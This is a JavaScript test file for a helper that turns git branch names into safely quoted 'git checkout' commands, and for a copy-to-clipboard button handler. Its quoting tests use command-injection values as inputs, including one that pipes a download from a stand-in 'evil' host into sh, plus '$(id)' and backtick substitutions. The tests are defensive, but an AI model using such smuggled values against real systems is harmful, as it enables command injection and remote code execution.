import { test, mock } from 'node:test';
import assert from 'node:assert/strict';
import { checkoutCommand, handleCopyClick } from '../public/copy-branch.js';
import { node } from './fake-dom.mjs';

// A copy button as app-render.js draws it: its icons, what it copies, its tooltip
function copyButton(copy = 'git checkout feat-a') {
    const button = node({ tag: 'button', classes: ['copy-button', 'copy-checkout'], dataset: { copy } },
        node({ tag: 'i', classes: ['fas', 'fa-terminal', 'copy-icon'] }));
    button.title = `Copy: ${copy}`;
    return button;
}

// What handleCopyClick is given in place of the page's: a clipboard
// recording what it is given, the status region, timers run by the test
function fakes({ clipboard } = {}) {
    const written = [];
    const timers = new Map();
    let nextTimer = 1;
    return {
        written,
        timers,
        options: {
            clipboard: clipboard === undefined ? { writeText: async text => { written.push(text); } } : clipboard,
            status: { textContent: '' },
            setTimeout: (callback, delay) => {
                timers.set(nextTimer, { callback, delay });
                return nextTimer++;
            },
            clearTimeout: id => timers.delete(id)
        }
    };
}

// The clipboard answers in a promise: the feedback follows it
const settled = () => new Promise(resolve => setImmediate(resolve));

const runTimers = timers => {
    for (const [id, { callback }] of timers) {
        timers.delete(id);
        callback();
    }
};

test('checkoutCommand leaves a plain branch name bare', () => {
    assert.equal(checkoutCommand('feature/ABC-123-export'), 'git checkout feature/ABC-123-export --');
    assert.equal(checkoutCommand('release_2.1+hotfix@x=y,z%20'), 'git checkout release_2.1+hotfix@x=y,z%20 --');
});

test('checkoutCommand puts in single quotes a name the shell would read: $, ;, |, &, a backtick, parentheses, quotes, !, #, braces', () => {
    assert.equal(checkoutCommand('x;curl${IFS}evil|sh'), "git checkout 'x;curl${IFS}evil|sh' --");
    assert.equal(checkoutCommand('a&b'), "git checkout 'a&b' --");
    assert.equal(checkoutCommand('a`id`'), "git checkout 'a`id`' --");
    assert.equal(checkoutCommand('a$(id)'), "git checkout 'a$(id)' --");
    assert.equal(checkoutCommand('a"b!c#d{e}'), `git checkout 'a"b!c#d{e}' --`);
    assert.equal(checkoutCommand('é'), "git checkout 'é' --");
});

test('checkoutCommand writes a single quote in the name as \'\\\'\'', () => {
    assert.equal(checkoutCommand("it's"), "git checkout 'it'\\''s' --");
});

// `git checkout docs`, with origin/docs not fetched yet, restores the folder
// docs/ from the index, losing its changes; the trailing -- makes the name a
// branch only: git still creates it from a fetched remote branch, and fails
// otherwise
test('checkoutCommand ends with -- so that a branch named like a path is never read as one', () => {
    assert.equal(checkoutCommand('docs'), 'git checkout docs --');
});

// refs/heads/-f can be pushed with plain git: `git checkout -f` would throw
// the uncommitted changes away
test('checkoutCommand ends the options before a name starting with -, which git would read as an option', () => {
    assert.equal(checkoutCommand('-f'), 'git checkout --end-of-options -f --');
    assert.equal(checkoutCommand('--detach'), 'git checkout --end-of-options --detach --');
    assert.equal(checkoutCommand('-a;b'), "git checkout --end-of-options '-a;b' --");
});

test('handleCopyClick takes no click outside a copy button and writes nothing', async () => {
    const { written, options } = fakes();
    const other = node({ tag: 'a', classes: ['pull-request-link'] });
    assert.equal(handleCopyClick({ target: other }, options), false);
    await settled();
    assert.deepEqual(written, []);
    assert.equal(options.status.textContent, '');
});

test('handleCopyClick copies what the button carries, from the button or its icon, and shows it copied for 1.5 s', async () => {
    const { written, timers, options } = fakes();
    const button = copyButton();
    assert.equal(handleCopyClick({ target: button.firstElementChild }, options), true);
    await settled();
    assert.deepEqual(written, ['git checkout feat-a']);
    assert.ok(button.classList.contains('copied'));
    assert.ok(!button.classList.contains('copy-failed'));
    assert.equal(button.title, 'Copied: git checkout feat-a');
    assert.equal(options.status.textContent, 'Copied: git checkout feat-a');
    assert.deepEqual([...timers.values()].map(({ delay }) => delay), [1500]);

    runTimers(timers);
    assert.ok(!button.classList.contains('copied'));
    assert.equal(button.title, 'Copy: git checkout feat-a');
    assert.equal(options.status.textContent, '');

    assert.equal(handleCopyClick({ target: button }, options), true);
    await settled();
    assert.deepEqual(written, ['git checkout feat-a', 'git checkout feat-a']);
});

test('handleCopyClick says the clipboard needs https or localhost when the page has none', async () => {
    const { timers, options } = fakes({ clipboard: null });
    const button = copyButton();
    assert.equal(handleCopyClick({ target: button }, options), true);
    await settled();
    assert.ok(button.classList.contains('copy-failed'));
    assert.ok(!button.classList.contains('copied'));
    assert.equal(button.title, 'Copy failed: the clipboard needs https or localhost');
    assert.equal(options.status.textContent, 'Copy failed: the clipboard needs https or localhost');
    runTimers(timers);
    assert.ok(!button.classList.contains('copy-failed'));
    assert.equal(button.title, 'Copy: git checkout feat-a');
});

// Safari keeps the user activation a clipboard write needs during the event only
test('handleCopyClick writes to the clipboard during the click itself', () => {
    const { written, options } = fakes();
    handleCopyClick({ target: copyButton() }, options);
    assert.deepEqual(written, ['git checkout feat-a']);
});

test('handleCopyClick gives the reason of a refused write, thrown or rejected', async () => {
    for (const writeText of [async () => { throw new Error('Document is not focused.'); }, () => { throw new Error('Document is not focused.'); }]) {
        const { options } = fakes({ clipboard: { writeText } });
        const button = copyButton();
        handleCopyClick({ target: button }, options);
        await settled();
        assert.ok(button.classList.contains('copy-failed'));
        assert.equal(button.title, 'Copy failed: Document is not focused.');
        assert.equal(options.status.textContent, 'Copy failed: Document is not focused.');
    }
});

test('handleCopyClick restarts the 1.5 s on a second click, and the tooltip comes back as it was before the first', async () => {
    const { timers, options } = fakes();
    const button = copyButton();
    handleCopyClick({ target: button }, options);
    await settled();
    handleCopyClick({ target: button }, options);
    await settled();
    assert.equal(timers.size, 1);
    assert.ok(button.classList.contains('copied'));
    runTimers(timers);
    assert.ok(!button.classList.contains('copied'));
    assert.equal(button.title, 'Copy: git checkout feat-a');
});

test('handleCopyClick leaves the status region alone at the end of a copy when a later copy wrote it', async () => {
    const { timers, options } = fakes();
    const first = copyButton('feat-a');
    const second = copyButton('feat-b');
    handleCopyClick({ target: first }, options);
    await settled();
    handleCopyClick({ target: second }, options);
    await settled();
    const [[firstId, firstTimer]] = timers;
    timers.delete(firstId);
    firstTimer.callback();
    assert.equal(options.status.textContent, 'Copied: feat-b');
});

test('handleCopyClick reads the page\'s clipboard, status region and timers when it is called', async () => {
    mock.timers.enable({ apis: ['setTimeout'] });
    const status = { textContent: '' };
    const saved = Object.getOwnPropertyDescriptor(globalThis, 'document');
    globalThis.document = { getElementById: id => (id === 'copyStatus' ? status : null) };
    try {
        const button = copyButton();
        // node has a navigator without a clipboard, like a page over plain http
        assert.equal(handleCopyClick({ target: button }), true);
        await settled();
        assert.equal(status.textContent, 'Copy failed: the clipboard needs https or localhost');
        mock.timers.tick(1500);
        assert.ok(!button.classList.contains('copy-failed'));
        assert.equal(status.textContent, '');
    } finally {
        mock.timers.reset();
        if (saved) Object.defineProperty(globalThis, 'document', saved);
        else delete globalThis.document;
    }
});
